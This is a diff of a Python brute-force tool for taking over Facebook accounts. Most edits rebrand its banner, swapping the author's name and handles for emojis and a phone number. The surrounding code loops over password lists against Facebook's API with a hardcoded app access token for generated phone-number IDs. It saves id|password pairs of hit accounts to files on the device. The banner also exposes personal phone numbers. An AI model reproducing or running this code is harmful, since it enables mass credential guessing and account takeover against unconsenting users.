@@ -1,5 +1,5 @@
 #DECODE/BY/ASIF
-#A+S
+#👌
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
 
 try:
@@ -160,17 +160,17 @@ ________________________________________________
                            
 ================================================
 \033[1;31m================================================
-\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{ASIF ULLAH }\33[0;m      
-\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{Asifullah Shineari }\33[0;m        
-\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{22As55}\33[0;m              
-\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{Asifullah Shinwari}\33[0;m      
-\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHJan ZaDa \33[1;31m  ┇\033[31;47m{+93771211599 }\33[0;m
+\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{👇 ULLAH }\33[0;m      
+\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{+4591937471 }\33[0;m        
+\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{👌👌}\33[0;m              
+\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{😂😂😂}\33[0;m      
+\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHJan ZaDa \33[1;31m  ┇\033[31;47m{+4591937471 }\33[0;m
 \033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mNETWORK \33[1;31m   ┇\033[1;37m{3G, 4G/5G, LTE }\33[0;m
 \033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mCOMMAND \33[1;31m   ┇\033[37;41m{FREE}\33[0;m
 \033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mVERSION   \033[1;31m ┇\033[31;47m{0.6}\33[0;m                 
 \033[1;31m================================================
-\33[37;41m\t WELLCOME TO A+S TOOLS\33[0;m
-\033[1;33m========= \33[32;33mAFG ≠ 2023 ≠ 64Bit\33[1;33m =========""")
+\33[37;41m\t WELLCOME TO 👌👌 TOOLS\33[0;m
+\033[1;33m========= \33[32;33mAFG ≠ 2023 /11/23≠ 64Bit\33[1;33m =========""")
 def linex():
 	print('\033[1;37m----------------------------------------------')
 def clear():
@@ -370,8 +370,8 @@ def api1(ids,names,passlist):
 					break
 				elif 'www.facebook.com' in q['error_msg']:
 					if 'y' in pcp:
-						print('\r\r\x1b[38;5;205m [A+S-CP] '+ids+' | '+pas+'\033[1;97m')
-						open('/sdcard/A+S-CP.txt','a').write(ids+'|'+pas+'\n')
+						print('\r\r\x1b[38;5;205m [😂😂-CP] '+ids+' | '+pas+'\033[1;97m')
+						open('/sdcard/😂😂-CP.txt','a').write(ids+'|'+pas+'\n')
 						cps.append(ids)
 						break
 					else:
@@ -390,7 +390,7 @@ def api1(ids,names,passlist):
 def AFG():
 		user=[]
 		clear()
-		print('\033[1;35m Code example: +9377,9378,+9379,+9373')
+		print('\033[1;35m Code example: 077,078,079,073')
 		code = input('\033[1;37m PUT CODE: ')
 		try:
 			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT: '))
@@ -434,7 +434,7 @@ FJoya = random.choice(FJoya1)
 def fking1(ids,passlist):
         global loop
         global oks
-        sys.stdout.write('\r\r\033[37;41m [A+S]\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[37;41m [😂😂\33[0;m %s|\033[1;32mOK:-%s \033[1;31m'%(loop,len(oks)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
